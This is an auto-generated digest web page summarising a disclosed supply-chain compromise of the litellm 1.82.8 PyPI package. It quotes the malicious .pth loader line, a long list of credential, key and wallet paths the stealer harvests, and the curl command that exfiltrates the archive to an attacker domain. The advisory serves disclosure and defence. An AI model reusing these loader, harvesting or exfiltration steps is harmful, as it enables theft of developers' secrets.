@@ -1,0 +1,38 @@
+<!doctype html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>LiteLLM Python package compromised by supply-chain attack</title><style>
+:root { --bg:#f5f7fb; --panel:#ffffff; --text:#0f172a; --muted:#64748b; --line:#e2e8f0; --brand:#3b82f6; --brand2:#8b5cf6; }
+@media (prefers-color-scheme: dark){ :root { --bg:#0b1020; --panel:#11172a; --text:#e2e8f0; --muted:#94a3b8; --line:#24324a; --brand:#60a5fa; --brand2:#a78bfa; } }
+*{ box-sizing:border-box; }
+body { margin:0; background:linear-gradient(180deg,var(--bg),var(--bg)); color:var(--text); font-family: Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial; line-height:1.6; }
+.wrap{ max-width:1100px; margin:0 auto; padding:24px 16px 48px; }
+.topbar{ display:flex; justify-content:space-between; align-items:center; padding:10px 0 16px; border-bottom:1px solid var(--line); }
+.brand{ font-weight:800; letter-spacing:.2px; color:var(--text); text-decoration:none; }
+.sub{ color:var(--muted); font-size:14px; }
+.hero{ margin:20px 0; padding:20px; border:1px solid var(--line); border-radius:16px; background:linear-gradient(120deg, color-mix(in srgb, var(--brand) 12%, var(--panel)), color-mix(in srgb, var(--brand2) 12%, var(--panel))); }
+.hero h1{ margin:0 0 8px; font-size:34px; line-height:1.2; }
+.grid{ display:grid; grid-template-columns:1fr; gap:14px; }
+.card{ border:1px solid var(--line); border-radius:14px; padding:16px; background:var(--panel); box-shadow: 0 2px 10px rgba(0,0,0,.04); }
+.card h2{ margin:0 0 6px; font-size:21px; line-height:1.3; }
+.meta{ color:var(--muted); font-size:13px; }
+.excerpt{ margin:10px 0 12px; color:var(--text); }
+a{ color:var(--brand); text-decoration:none; }
+a:hover{ text-decoration:underline; }
+.badge{ display:inline-block; font-size:11px; border:1px solid var(--line); border-radius:999px; padding:2px 8px; margin-right:8px; background:color-mix(in srgb, var(--panel) 80%, var(--brand) 20%); }
+.actions{ display:flex; gap:14px; font-size:14px; }
+footer{ margin-top:28px; color:var(--muted); font-size:13px; border-top:1px solid var(--line); padding-top:14px; }
+.back{ font-size:14px; color:var(--muted); }
+</style></head><body><div class='wrap'>
+    <div class='topbar'><a class='brand' href='../index.html'>Daily Dev Articles</a><span class='sub'>Curated daily software reading</span></div>
+    <div class='hero'>
+      <a class='back' href='../index.html'>← Back to all digests</a>
+      <h1>LiteLLM Python package compromised by supply-chain attack</h1>
+      <p class='meta'><span class='badge'>Hacker News</span>Rank #9 · HN score 310 · 2026-03-24 12:36 UTC</p>
+      <div class='actions'><a href='https://github.com/BerriAI/litellm/issues/24512' target='_blank' rel='noopener'>Open original article ↗</a></div>
+    </div>
+    <div class='card'>
+      <h2>Summary</h2>
+      <p class='excerpt'>- - Notifications You must be signed in to change notification settings - Fork 6.7k Open Labels Description [Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 PyPI package — credential stealer Summary The litellm==1.82.8 wheel package on PyPI contains a malicious .pth file (litellm_init.pth , 34,628 bytes) that automatically executes a credential-stealing script every time the Python interpreter starts — no import litellm required. This is a supply chain compromise. The malicious file is listed in the package&#x27;s own RECORD : litellm_init.pth,sha256=ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg,34628 Reproduction pip download litellm==1.82.8 --no-deps -d /tmp/check python3 -c &quot; import zipfile, os whl = &#x27;/tmp/check/&#x27; + [f for f in os.listdir(&#x27;/tmp/check&#x27;) if f.endswith(&#x27;.whl&#x27;)][0] with zipfile.ZipFile(whl) as z: pth = [n for n in z.namelist() if n.endswith(&#x27;.pth&#x27;)] print(&#x27;PTH files:&#x27;, pth) for p in pth: print(z.read(p)[:300]) &quot; You will see litellm_init.pth containing: import os, subprocess, sys; subprocess.Popen([sys.executable, &quot;-c&quot;, &quot;import base64; exec(base64.b64decode(&#x27;...&#x27;))&quot;]) Malicious Behavior (full analysis) The payload is double base64-encoded.</p>
+      <h2>Key Takeaways</h2>
+      <ul><li>When decoded, it performs the following: Stage 1: Information Collection The script collects sensitive data from the host system: - System info: hostname ,whoami ,uname -a ,ip addr ,ip route - Environment variables: printenv (captures all API keys, secrets, tokens) - SSH keys: ~/.ssh/id_rsa ,~/.ssh/id_ed25519 ,~/.ssh/id_ecdsa ,~/.ssh/id_dsa ,~/.ssh/authorized_keys ,~/.ssh/known_hosts ,~/.ssh/config - Git credentials: ~/.gitconfig ,~/.git-credentials - AWS credentials: ~/.aws/credentials ,~/.aws/config , IMDS token + security credentials - Kubernetes secrets: ~/.kube/config ,/etc/kubernetes/admin.conf ,/etc/kubernetes/kubelet.conf ,/etc/kubernetes/controller-manager.conf ,/etc/kubernetes/scheduler.conf , service account tokens - GCP credentials: ~/.config/gcloud/application_default_credentials.json - Azure credentials: ~/.azure/ - Docker configs: ~/.docker/config.json ,/kaniko/.docker/config.json ,/root/.docker/config.json - Package manager configs: ~/.npmrc ,~/.vault-token ,~/.netrc ,~/.lftprc ,~/.msmtprc ,~/.my.cnf ,~/.pgpass ,~/.mongorc.js - Shell history: ~/.bash_history ,~/.zsh_history ,~/.sh_history ,~/.mysql_history ,~/.psql_history ,~/.rediscli_history - Crypto wallets: ~/.bitcoin/ ,~/.litecoin/ ,~/.dogecoin/ ,~/.zcash/ ,~/.dashcore/ ,~/.ripple/ ,~/.bitmonero/ ,~/.ethereum/keystore/ ,~/.cardano/ ,~/.config/solana/ - SSL/TLS private keys: /etc/ssl/private/ , Let&#x27;s Encrypt.pem and.key files - CI/CD secrets: terraform.tfvars ,.gitlab-ci.yml ,.travis.yml ,Jenkinsfile ,.drone.yml ,Anchor.toml ,ansible.cfg - Database credentials: PostgreSQL, MySQL, Redis, LDAP config files - Webhook URLs: grep for Slack/Discord webhook URLs in env and config files Stage 2: Encryption &amp; Exfiltration - Collected data is written to a temporary file - A random 32-byte AES-256 session key is generated via openssl rand - The collected data is encrypted with openssl enc -aes-256-cbc -pbkdf2 - The AES session key is encrypted with a hardcoded 4096-bit RSA public key via openssl pkeyutl -encrypt -pkeyopt rsa_padding_mode:oaep - Both encrypted files are packed into tpcp.tar.gz - The archive is exfiltrated via: curl -s -o /dev/null -X POST \ &quot;https://models.litellm.cloud/&quot; \ -H &quot;Content-Type: application/octet-stream&quot; \ -H &quot;X-Filename: tpcp.tar.gz&quot; \ --data-binary @tpcp.tar.gz Key Technical Details - Trigger mechanism: .pth files insite-packages/ are executed automatically by the Python interpreter on startup (see Python docs on .pth files).</li><li>Noimport statement is needed.</li><li>- Stealth: The payload is double base64-encoded, making it invisible to naive source code grep.</li></ul>
+    </div>
+    <footer>Auto-generated daily digest entry.</footer>
+    </div></body></html>
